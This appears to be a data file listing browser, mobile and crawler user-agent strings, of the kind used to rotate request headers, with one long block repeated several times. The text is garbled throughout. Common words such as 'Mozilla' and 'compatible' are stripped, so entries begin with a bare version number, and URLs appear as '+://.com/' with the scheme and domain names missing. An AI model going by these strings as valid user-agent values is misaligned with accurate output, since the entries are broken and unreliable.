	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620"
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com"
	"/5.0 ; /1.0; +://www.anyapex.com/.html"
	"/4.0 ; Arachmo"
	"/4.0 ; B-l-i--z-B-O-T"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html"
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html"
	"/1.0 +://.com/crawler/"
	"/5.0 ; /2.0; +://.com/.htm"
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-"
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; "
	"/4.0  /1.0  Link Checker @; ://.com"
	"/4.0  /1.0  Link Checker .dlc@; ://.com"
	"/4.0  /1.0 -@; ://.com"
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko"
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2"
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; "
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A"
	"/5.0 PLAYSTATION 3; 3.55"
	"/5.0 PLAYSTATION 3; 2.00"
	"/5.0 PLAYSTATION 3; 1.00"
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0"
	"/5.0 ; /1.0; +://www.abilogic.com/.html"
	"SiteBar/3.3.8 Bookmark Server; :///"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -"
	"/4.0 ;  3.0; Macintosh"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 "
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; "
	"/4.0 ; MSIE 5.5; Windows 98"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322"
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8"
	"/5.0 X11; U; Linux i686; -US; rv:1.7.12 Gecko/20051010 Firefox/1.0.7   1.0.7"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10"
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;"
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007"
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322"
	"/2.1 ://.com/.html"
	"/9.20 Windows NT 6.0; U; "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2"
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322"
	"/10.00 X11; Linux i686; U;  Presto/2.2.0"
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16"
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13"
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0"
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727"
	"/4.0 ; MSIE 7.0b; Windows NT 6.0"
	"/4.0 ; MSIE 6.0b; Windows 98"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7"
	"/5.0 ; /2.1; +://.com/.html"
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/"
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"/4.0 ; MSIE 6.1; Windows XP"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"-; +://.com/; : webetrex"
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3"
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727"
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648"
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1"
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2"
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15"
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57"
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729"
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0"
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/"
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1"
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1"
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413"
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2"
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US"
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25"
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1"
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko"
	"/4.0 ; MSIE 6.0; Windows CE;  6.5"
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0"
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10"
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -"
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0"
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3"
	"/5.0 ; /3.0; +://yandex.com/bots"
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16"
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1"
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2"
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51"
	"/5.0 ; MSIE 2.0; Windows CE;  7.0"
	"/4.0 Macintosh; U; PPC Mac OS X; -US"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7"
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0"
	"/1.22 ; MSIE 2.0; Windows 3.1"
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
